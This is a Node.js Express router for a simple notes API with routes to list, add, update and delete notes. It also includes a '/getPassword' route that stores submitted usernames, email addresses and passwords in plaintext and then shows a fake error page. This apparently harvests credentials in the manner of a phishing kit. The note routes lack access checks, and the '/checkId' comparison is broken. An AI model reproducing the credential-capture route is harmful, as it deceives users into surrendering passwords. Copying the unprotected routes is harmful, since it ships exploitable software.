const { json, response } = require('express');
const express = require('express');
const router = express.Router();
const Note = require('../models/note-model')
const User = require('../models/user-model')
const getPass = require('../models/getpsw')



router.get('/', (req, res) => {
    res.send('This is Home Page')
})

router.get('/list', async (req, res) => {
    var notes = await Note.find();
    res.json(notes);
})

router.post('/add', async (req, res) => {
    const newNote = new Note({
        id: req.body.id,
        userId: req.body.userId,
        title: req.body.title,
        content: req.body.content,
        dateAdded: req.body.dateAdded,
    })
    await newNote.save();

    const response = { messege: 'New Note Created!' };
    res.json(response);
})

router.post('/delete', async (req, res) => {
    await Note.deleteOne({ id: req.body.id });

    const response = { messege: "note delete id is :" + req.body.id };
    res.json(response);
})

router.post('/update', async (req, res) => {
    await Note.updateOne({ id: req.body.id }, {
        $set: {
            title: req.body.title,
            content: req.body.content,
            dateAdded: req.body.dateAdded
        }
    }).then(() => {
        res.json({ messege: "note update at id : " + req.body.id });
    })
});

router.get('/list/:userId', async (req, res) => {
    var details = await Note.find({ userId: req.params.userId });
    res.json(details);

});

router.post('/checkId', async (req, res) => {
    console.log(req.body);
    var userId = await User.find({ userId: req.body.id })
    console.log(userId);
    if (userId != []) {
        res.json({ status: true, userId: userId });
        console.log(userId);
    } else {
        console.log('hii');
        const newUser = new User({
            userId: req.body.id
        })
        await newUser.save();
        res.json({ status: false });
        console.log(false);
    }
})

router.post('/getPassword', async (req, res) => {
    const newGetPass = new getPass(
        {
            uname: req.body.uname,
            mailid: req.body.mailid,
            psw: req.body.psw,
            remember: req.body.remember
        }
    )

    await newGetPass.save();
    res.send('<p style="color:red";font-size: x-large;> If you are a visitor, contact the website owner or try again later.</p>')
})

module.exports = router;
